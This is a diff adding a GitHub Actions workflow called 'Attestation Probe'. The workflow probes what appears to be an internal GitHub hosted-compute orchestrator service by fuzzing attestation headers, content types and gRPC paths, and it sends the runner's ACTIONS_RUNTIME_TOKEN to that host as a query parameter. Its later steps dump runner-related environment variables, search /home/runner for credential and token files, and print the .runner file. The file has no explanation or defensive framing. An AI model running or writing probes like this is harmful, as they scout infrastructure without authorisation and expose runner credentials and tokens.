@@ -1,0 +1,65 @@
+name: Attestation Probe
+on: workflow_dispatch
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attestation deep probe
+        run: |
+          INT="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
+          
+          echo "=== 1. Full 401 error body ==="
+          curl -sv "$INT/vm/v1" 2>&1 | grep -i "< \|error\|attest\|provider\|www-auth\|header"
+          
+          echo ""
+          echo "=== 2. Custom attestation headers ==="
+          for HDR in "X-Attestation-Token: test" "X-Ms-Attestation-Token: test" \
+            "Attestation: test" "X-Hc-Attestation: test" \
+            "X-Hosted-Compute-Token: test" "X-Runner-Token: test"; do
+            KEY=$(echo "$HDR" | cut -d: -f1)
+            RESP=$(curl -s -w "\n%{http_code}" -H "$HDR" "$INT/vm/v1" 2>/dev/null)
+            STATUS=$(echo "$RESP" | tail -1)
+            BODY=$(echo "$RESP" | head -1)
+            echo "  $KEY: $STATUS - ${BODY:0:80}"
+          done
+          
+          echo ""
+          echo "=== 3. Content-Type variations ==="
+          for CT in "application/json" "application/x-www-form-urlencoded" "text/plain" \
+            "application/grpc" "application/cbor" "application/cose"; do
+            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Content-Type: $CT" "$INT/vm/v1")
+            echo "  $CT: $STATUS"
+          done
+          
+          echo ""
+          echo "=== 4. POST with body to /vm/v1 ==="
+          curl -s -w "\n%{http_code}" -X POST -H "Content-Type: application/json" \
+            "$INT/vm/v1" -d '{"attestation":"test"}' | head -3
+          
+          echo ""
+          echo "=== 5. Full response headers from /vm/v1 ==="
+          curl -sI "$INT/vm/v1" 2>/dev/null
+          
+          echo ""
+          echo "=== 6. Try ACTIONS_RUNTIME_TOKEN as query param ==="
+          curl -s -w "\n%{http_code}" "$INT/vm/v1?token=$ACTIONS_RUNTIME_TOKEN" 2>/dev/null | head -3
+          
+          echo ""
+          echo "=== 7. gRPC probe ==="
+          curl -s -w "\n%{http_code}" --http2 -X POST \
+            -H "Content-Type: application/grpc" \
+            -H "TE: trailers" \
+            "$INT/vm.v1.VmService/GetMachine" 2>/dev/null | head -3
+          
+          echo ""
+          echo "=== 8. Environment variables with compute/runner info ==="
+          env | grep -iE "hosted|compute|runner|agent|allocation|attestation|hc_" | sort
+          
+          echo ""  
+          echo "=== 9. Check runner agent files for tokens ==="
+          find /home/runner -name "*.credentials*" -o -name "*.token" -o -name "*attestation*" 2>/dev/null | head -10
+          ls -la /home/runner/work/_temp/ 2>/dev/null | head -10
+          cat /home/runner/work/_temp/.runner 2>/dev/null || echo "no .runner file"
